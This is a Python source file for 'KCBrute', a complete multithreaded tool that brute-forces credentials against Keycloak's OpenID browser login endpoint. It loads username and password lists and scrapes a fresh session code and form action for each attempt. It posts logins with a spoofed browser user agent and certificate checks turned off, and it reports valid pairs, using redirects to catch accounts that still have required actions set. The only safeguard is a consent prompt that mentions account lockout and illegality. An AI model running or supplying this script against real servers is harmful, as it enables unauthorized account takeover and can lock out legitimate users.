import requests, re, argparse, validators, os, threading, concurrent.futures, urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs
from requests.exceptions import ConnectionError
from pathlib import Path
from time import sleep

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

''' Colors '''
MAIN = '\033[38;5;50m'
GREEN = '\033[38;5;82m'
ORNG = '\033[0;38;5;214m'
PURPLE = '\033[0;38;5;141m'
RED = '\033[1;31m'
RST = '\033[0m'
BOLD = '\033[1m'
GR = '\033[38;5;244m'
INPUT = f'[{ORNG}!{RST}]'
SCS = f'[{GREEN}Success{RST}]'
INFO = f'[{MAIN}Info{RST}]'
INV = f'[{GR}Invalid{RST}]'
ERR = f'[{RED}Error{RST}]'
DEBUG = f'[{ORNG}Debug{RST}]'
OOPS = f'[{RED}Oops!{RST}]'


def do_nothing():
	pass


def is_valid_url(url):
	return validators.url(url) 


def debug(msg):
	print(f'{DEBUG} {msg}')
	exit(1)

# -------------- Arguments -------------- #
parser = argparse.ArgumentParser(
	description="Basic brute-force script targeting the standard Keycloak Admin/User Console browser login flow."
)
basic_group = parser.add_argument_group('BASIC OPTIONS')
basic_group.add_argument("-l", "--login-url", action="store", help = "Full Keycloak OpenID Authorization Endpoint URL to attack (Typically something like: \nhttps://keycloak.example.com/realms/{REALM}/protocol/openid-connect/auth?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&state={UUID}&response_mode={MODE}&response_type={TYPE}&scope=openid&nonce={UUID}&code_challenge={TOKEN}&code_challenge_method={TYPE} ).", type = str, required = True)
basic_group.add_argument("-u", "--usernames-file", action="store", help = "File containing a usernames list.", required = True) 
basic_group.add_argument("-p", "--passwords-file", action="store", help = "File containing a passwords list.", required = True)
basic_group.add_argument("-t", "--threads", action="store", help = "Number of threads to use.", type = int)
basic_group.add_argument("-r", "--accept-risk", action="store_true", help = "By selecting this option, you consent to attacking the host.")
basic_group.add_argument("-s", "--success-stop", action="store_true", help = "Stop upon finding a valid pair.")

output_group = parser.add_argument_group('OUTPUT')
output_group.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
output_group.add_argument("-v", "--verbose", action="store_true", help = "Verbose output.")

args = parser.parse_args()

login_url = args.login_url

if not is_valid_url(login_url):
	debug('Invalid login_url.')

# Threading
if isinstance(args.threads, int):
	if args.threads <= 0:
		debug('Number of threads must be a positive integer.')

max_threads = 10 if not args.threads else args.threads
thread_limiter = threading.BoundedSemaphore(max_threads)
stop_event = threading.Event()
lock = threading.Lock()
count = 0

# Standard headers for the login requests
gen_login_req_headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate, br",
	"Content-Type": "application/x-www-form-urlencoded"
}

session = requests.Session()

# Not used, but might come in handy later 
# def parse_keycloak_url(url):
# 	parsed_url = urlparse(url)
# 	path_parts = parsed_url.path.strip("/").split("/")
	
# 	# Extract protocol, host, port
# 	protocol = parsed_url.scheme
# 	hostname = parsed_url.hostname
# 	port = parsed_url.port or (443 if protocol == "https" else 80)

# 	# Extract realm and connect type
# 	realm = path_parts[1] if len(path_parts) > 1 and path_parts[0] == "realms" else None
# 	connect_type = path_parts[3] if len(path_parts) > 3 and path_parts[2] == "protocol" else None
	
# 	# Extract query parameters
# 	params = {key: value[0] for key, value in parse_qs(parsed_url.query).items()}

# 	return {
# 		"protocol": protocol,
# 		"hostname": hostname,
# 		"port": port,
# 		"realm": realm,
# 		"connect_type": connect_type,
# 		"parameters": params
# 	}


def extract_login_action(html_data): 
	# Extracts the 'action' attribute from the form with id 'kc-form-login' in an http response.
	soup = BeautifulSoup(html_data, "html.parser")
	form = soup.find("form", id="kc-form-login")
	return form["action"] if form and "action" in form.attrs else None


def extract_session_code(url):
	# Extracts the value of the 'session_code' parameter from a URL.
	parsed_url = urlparse(url)
	query_params = parse_qs(parsed_url.query)
	return query_params.get("session_code", [None])[0]


def get_file_contents(path):
	expanded_path = os.path.expanduser(path)
	if Path(expanded_path).exists():
		f = open(expanded_path, 'r')
		contents = f.read()
		f.close()
		return [w for w in contents.split('\n') if len(w)]
	else:
		False


def login_request(action_url, username, passwd, cookies):
	try:
		data = {
			"username": f"{username}",
			"password": f"{passwd}",
			"credentialId": f""
		}

		res = session.post(action_url, verify = False, allow_redirects = False, headers = gen_login_req_headers, cookies = cookies, data = data)
		if res.status_code == 302:
			# Normal successful login indicator, for accounts without required actions set.
			if "Set-Cookie" in res.headers.keys():
				if 'KEYCLOAK_IDENTITY' in res.headers["Set-Cookie"]:
					print(f'{SCS} {BOLD}{username} : {passwd}{RST}')
					stop_event.set() if args.success_stop else do_nothing()
					return
			else:
				# In most cases, if required actions are set for an account, the Location header value can be used to identify a successful login
				required_user_actions = re.findall('login\\-actions\\/required\\-action\\?execution\\=(?:CONFIGURE_TOTP|UPDATE_PASSWORD|UPDATE_PROFILE|VERIFY_EMAIL|webauthn-register|webauthn-register-passwordless|update_user_locale|delete_credential)', res.headers["Location"])
				if required_user_actions: 
					print(f'{SCS} {BOLD}{username} : {passwd}{RST} ({ORNG}required_user_action = {required_user_actions[0].split("execution=")[1]}{RST})')
					stop_event.set() if args.success_stop else do_nothing()
					return
		else:
			print(f'{INV} {GR}{username} : {passwd}{RST}') if (args.verbose and not stop_event.is_set()) else do_nothing()

	except Exception as e:
		print(F'{OOPS} Something went wrong: {e}')
		

def kcbrute(username, passwd, login_url):
	if stop_event.is_set():  # Check if another thread found a valid pair (-s, --success-stop option)
		return

	thread_limiter.acquire()

	try:
		if 'KEYCLOAK_IDENTITY' in session.cookies:
			session.cookies.clear()
			
		# Retrieve a fresh session_code
		res = session.get(login_url, verify = False, allow_redirects = False)
		action_url = extract_login_action(res.text)
		if not action_url and not stop_event.is_set():
			print(f"{ERR} Failed to retrieve action_url.")
			return
		
		new_cookies = {}
		
		try:
			res_cookies = res.headers["Set-Cookie"].split(', ')
			res_cookies = [v.split(';')[0] for v in res_cookies]			
			for c in res_cookies:
				tmp = c.split("=")
				# if tmp[0] not in ['KEYCLOAK_IDENTITY', 'KEYCLOAK_SESSION']:
				new_cookies[tmp[0]] = tmp[1]

		except Exception as e:
			print(f'{ERR} Failed to set new cookies')

		login_request(action_url, username, passwd, new_cookies)
		
	except KeyboardInterrupt:
		stop_event.set()
		
	except ConnectionError as e:
		print(f"{ERR} Failed to establish a connection: The requested address is not valid in its context.")

	except Exception as e:
		print(F'{OOPS} Something went wrong: {e}')
		
	finally:
		global count
		with lock:
			count += 1
		thread_limiter.release()


def print_banner():

	K = [[' ', '┬','┌','┐'], [' ', '├','┴','┐'], [' ', '┴',' ','┴']]
	C = [[' ', '┌','─','┐'], [' ', '│', ' ',' ',], [' ', '└','─','┘']]
	B = [[' ', '┌','┐',' '], [' ', '├','┴','┐'], [' ', '└','─','┘']]
	R = [[' ', '┬','─','┐'], [' ', '├','┬','┘'], [' ', '┴','└','─']]
	U = [[' ', '┬',' ','┬'], [' ', '│',' ','│'], [' ', '└','─','┘']]
	T = [[' ', '┌','┬','┐'], [' ', ' ','│',' '], [' ', ' ','┴',' ']]
	E = [[' ', '┌','─','┐'], [' ', '├','┤',' '], [' ', '└','─','┘']]

	banner = [K,C,B,R,U,T,E]
	final = []
	print('\r')
	init_color = 31
	txt_color = init_color
	cl = 0

	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 31

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}{RST}\n")


def progress(attempts):
	while not stop_event.is_set():
		sleep(5)
		print(F'{INFO} Login attempts completed: {count}/{attempts} ')


def main():
	
	try:
		print_banner() if not args.quiet else do_nothing()

		# Read the username and password files
		print(f'{INFO} Loading username and password lists.')
		usernames = get_file_contents(args.usernames_file)
		debug('Failed to read usernames file.') if not usernames else do_nothing()
		passwords = get_file_contents(args.passwords_file)
		debug('Failed to read usernames file.') if not passwords else do_nothing()
		users_count = len(usernames)
		passwds_count = len(passwords)
		attempts = users_count * passwds_count
		
		# Bruteforce attack
		print(f'{INFO} Number of usernames loaded:{RST} {users_count}')
		print(f'{INFO} Number of passwords loaded:{RST} {passwds_count}')
		print(f'{INFO} Estimated number of queued login attempts:{RST} {attempts}')
		print(f'{INFO} Number of threads:{RST} {max_threads}')
		
		# Consent
		if not args.accept_risk:
			con = input(f'{INPUT} This action may lock user accounts if brute force detection is enabled on the target server. Unauthorized use is illegal. Continue? [Y/n]: ')
			if con.strip().lower() not in ['y', 'yes']:
				exit(1)
		
		print(f'{INFO} Initiating Keycloak credential brute-force attack.')
		threading.Thread(target=progress, daemon = True, args=(attempts,)).start()

		with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
			for uname in usernames:
				for passwd in passwords:
					if stop_event.is_set():  
						break
					executor.submit(kcbrute, uname, passwd, login_url)
					
	except KeyboardInterrupt:
		stop_event.set()
		print(f'\r{INFO} Stopping...')		
		
	except Exception as e:
		print(f'{OOPS} Something went really wrong: {e}')
		exit(2)
		
	finally:
		print(f'{INFO} Attack completed.')
		exit(0)


if __name__ == '__main__':
	main()
